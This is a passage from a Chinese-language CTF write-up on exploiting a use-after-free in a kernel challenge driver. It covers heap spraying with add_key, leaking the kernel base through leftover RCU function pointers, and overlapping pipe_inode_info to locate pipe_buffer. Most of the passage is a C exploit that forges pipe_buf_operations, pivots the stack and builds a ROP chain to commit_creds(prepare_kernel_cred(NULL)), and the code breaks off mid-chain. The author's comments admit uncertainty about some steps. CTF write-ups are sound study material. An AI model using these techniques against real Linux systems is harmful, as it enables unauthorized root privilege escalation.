存在。</li><li><code>kmem_cache_cpu</code> 的 slub page 耗光，向 node 请求新的 slub page 分配 <code>user_key_payload</code> ，完成后 UAF obj 被释放并回到 <code>kmem_cache_node</code>。</li><li>继续堆喷 <code>user_key_payload</code> ，<code>kmem_cache_cpu</code> 的 slub page 耗光，向 node 请求新的 slub page 分配 <code>user_key_payload</code> 。</li><li>UAF obj 所在页面被取回，UAF obj 被分配为 <code>user_key_payload</code> 。</li><li>利用题目功能再次释放 UAF obj，利用题目功能进行堆喷获取到该 obj，从而覆写 <code>user_key_payload</code> 。</li></ul><p>可能有点难理解,简单来说就是每次add_key会使用两个obj,第一个是临时obj最终会释放,而我们的目标是uaf第二个user_key_payload,</p><p>每次add_key实际上slab减少一个obj,因此在耗尽第一个slab之前显然每次我们uaf控制的都是临时obj,但在第一个slab仅剩一个obj时,这个obj被用来做第一个临时obj,而去一个新的slab获取第二个obj用作user_key_payload,那么在这次add_key结束后,第一个obj又被释放,那么在第二个slab仅剩一个obj时,再来一次add_key就会使我们能够uaf的obj作为user_key_payload</p><p>接下来我们考虑越界读取什么数据，这里我们并不需要分配其他的结构体， <code>rcu_head-&gt;func</code> <strong>函数指针在 rcu 对象被释放后才会被写入并调用，但调用完并不会将其置为 NULL</strong>，因此我们可以通过释放密钥的方式在内核堆上留下内核函数指针，从而完成内核基址的泄露。即通过key_read泄露slab页中残余的函数指针</p><p>可以用来控制内核执行流的结构体有很多，但是我们需要考虑如何完整地执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 后再成功返回用户态，因此我们需要进行栈迁移以布置较为完整的 ROP gadget chain。</p><p>由于题目开启了 SMEP、SMAP 保护，因此我们只能在内核空间伪造函数表，同时<u>内核中的大部分结构体的函数表为静态指定</u>（例如 <code>tty-&gt;ops</code> 总是 <code>ptm（或pty）_unix98_ops</code>），因此我们还需要知道一个内容可控的内核对象的地址，从而在内核空间中伪造函数表。</p><p>wiki选择管道相关的结构体完成利用；在内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> 来表示的，对应的就是一个 <code>pipe_inode_info</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">    <span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;<span class="comment">//该结构体使用kmalloc-192分配</span></span><br></pre></td></tr></table></figure><p>可以看到其中有一个bufs指针指向一个<code>struct pipe_buffer</code>，每个 <code>pipe_buffer</code> 结构体对应一张用以存储数据的内存页,虽然这个结构体不大,但是slab分配时会分配1024大小的obj</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>pipe_buf_operations</code> 为一张函数表，当我们对管道进行特定操作时内核便会调用该表上对应的函数，例如当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，由此我们便能控制内核执行流，从而完成提权。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment"> * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment"> * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment"> * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment"> * error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment"> * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment"> * -&gt;steal() returns 0 for success, in which case the contents</span></span><br><span class="line"><span class="comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned</span></span><br><span class="line"><span class="comment"> * by the caller. The page may then be transferred to a different</span></span><br><span class="line"><span class="comment"> * mapping, the most often used case is insertion into different</span></span><br><span class="line"><span class="comment"> * file address space cache.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> (*steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>那么这里我们可以利用 UAF 使得 <code>user_key_payload</code> 与 <code>pipe_inode_info</code> 占据同一个 object， <code>pipe_inode_info</code> 刚好会将 <code>user_key_payload-&gt;datalen</code> 改为 <code>0xFFFF</code> (这个字段应该是一个指针,至于为什么会是ffff不太清除使得我们能够继续读取数据,为了能够泄露数据肯定是个先用其uaf <code>user_key_payload</code>再uaf<code>pipe_inode_info</code>，从而读取 <code>pipe_inode_info</code> 以<u>泄露出 <code>pipe_buffer</code> 的地址。</u></p><p>而 <code>pipe_buffer</code> 是动态分配的，因此我们可以利用题目功能预先分配一个对象作为 <code>pipe_buffer</code> 并直接uaf在其上伪造函数表即可。</p><p>最终<strong>exp</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* kmalloc-192 has only 21 objects on a slub, we don&#x27;t need to spray to many */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_SPRAY_NUM 40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_INODE_INFO_SZ 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUFFER_SZ 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_FREE_PAYLOAD_RCU 0xffffffff813d8210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff81096110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81e00ed0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250c9d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250ca4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XCHG_RDI_RAX_DEC_STH_RET 0xffffffff81adfc70</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> idx;</span><br><span class="line">    <span class="type">uint32_t</span> size;</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief allocate an object bby kmalloc(size, __GFP_ZERO | GFP_KERNEL )</span></span><br><span class="line"><span class="comment"> * __GFP_RECLAIM = __GFP_KSWAPD_RECLAIM | __GFP_DIRECT_RECLAIM </span></span><br><span class="line"><span class="comment"> * GFP_KERNEL = __GFP_RECLAIM | __GFP_IO | __GFP_FS</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param idx </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> * @param buf </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">uint32_t</span> idx, <span class="type">uint32_t</span> size, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">uint32_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> *buf, pipe_buffer_addr;</span><br><span class="line">    <span class="type">int</span> key_id[KEY_SPRAY_NUM], victim_key_idx = <span class="number">-1</span>, pipe_key_id;</span><br><span class="line">    <span class="type">char</span> desciption[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fundamental works */</span></span><br><span class="line">    bindCore(<span class="number">0</span>);</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;FAILED to open the /dev/rwctf file!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF on user_key_payload */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct UAF obj and spray keys...&quot;</span>);</span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;<span class="comment">//KEY_SPRAY_NUM不一定非得是40,只要能使得耗尽两个slab即可</span></span><br><span class="line">        <span class="built_in">snprintf</span>(desciption, <span class="number">0x100</span>, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;arttnba&quot;</span>, i);</span><br><span class="line">        key_id[i] = key_alloc(desciption, buf, PIPE_INODE_INFO_SZ - <span class="number">0x18</span>);</span><br><span class="line">        <span class="keyword">if</span> (key_id[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d key!\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to add_key()!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del(<span class="number">0</span>);<span class="comment">//uaf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* corrupt user_key_payload&#x27;s header */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] corrupting user_key_payload...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="number">0x2000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (KEY_SPRAY_NUM * <span class="number">2</span>); i++) &#123;</span><br><span class="line">        alloc(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);<span class="comment">//不太清楚为什么要循环这么多次,按照道理LIFO,第一个就应该是刚才del的0啊</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for oob-read and leak kernel base */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] try to make an OOB-read...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key_read(key_id[i], buf, <span class="number">0x4000</span>) &gt; PIPE_INODE_INFO_SZ) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found victim key at idx: %d\n&quot;</span>, i);</span><br><span class="line">            victim_key_idx = i;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            key_revoke(key_id[i]);</span><br><span class="line">        &#125;<span class="comment">//如果读了超过192个字符,那么就说明其是victim,否则的话将其销毁置函数指针</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_key_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;FAILED at corrupt user_key_payload!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_offset = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2000</span> / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (buf[i] &gt; kernel_base &amp;&amp; (buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x210</span>) &#123;</span><br><span class="line">            kernel_offset = buf[i] - USER_FREE_PAYLOAD_RCU;</span><br><span class="line">            kernel_base += kernel_offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="comment">//在读出来的内容中,挨个判断是否大于kernel_base并且以0x210结尾,是的话就基本确定其是所要的函数指针了,又一个疑问,这里其实有一定概率读出来的内容中并不存在函数指针的,例如目标obj位于slab的最后位置,而且就算确定有,那也是先读再销毁产生函数指针,靠Random freelist???</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kernel_offset == <span class="number">-1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;FAILED to leak kernel addr!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF on pipe_inode_buffer to leak pipe_buffer&#x27;s addr */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct UAF on pipe_inode_info...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 0-&gt;1-&gt;..., the 1 will be the payload object */</span></span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    alloc(<span class="number">1</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    del(<span class="number">1</span>);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pipe_key_id = key_alloc(<span class="string">&quot;arttnba3pipe&quot;</span>, buf, PIPE_INODE_INFO_SZ - <span class="number">0x18</span>);</span><br><span class="line">    del(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* this object is for the pipe buffer */</span></span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_BUFFER_SZ, buf);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);<span class="comment">//uaf PIPE_INODE_INFO and key_user_payload</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* note that the user_key_payload-&gt;datalen is 0xFFFF now */</span></span><br><span class="line">    retval = key_read(pipe_key_id, buf, <span class="number">0xffff</span>);</span><br><span class="line">    pipe_buffer_addr = buf[<span class="number">16</span>]; <span class="comment">/* pipe_inode_info-&gt;bufs得到pipe_buffer的地址 */</span>/</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got pipe_buffer: \033[0m0x%lx\n&quot;</span>, </span><br><span class="line">            pipe_buffer_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct fake pipe_buf_operations */</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = pipe_buffer_addr + <span class="number">0x18</span>;  <span class="comment">/* pipe_buffer-&gt;ops,是函数指针表指向buffer内部 */</span></span><br><span class="line">    <span class="comment">/* after release(), we got back here */</span></span><br><span class="line">    buf[<span class="number">3</span>] = kernel_offset + POP_RBX_POP_RBP_POP_R12_RET;</span><br><span class="line">    <span class="comment">/* pipe_buf_operations-&gt;release */</span></span><br><span class="line">    buf[<span class="number">4</span>] = kernel_offset + PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET;<span class="comment">//函数指针调用时第二个参数rsi就是buffer,所以之后才会又回到buf[3]</span></span><br><span class="line">    buf[<span class="number">5</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">6</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">7</span>] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    buf[<span class="number">8</span>] = <span 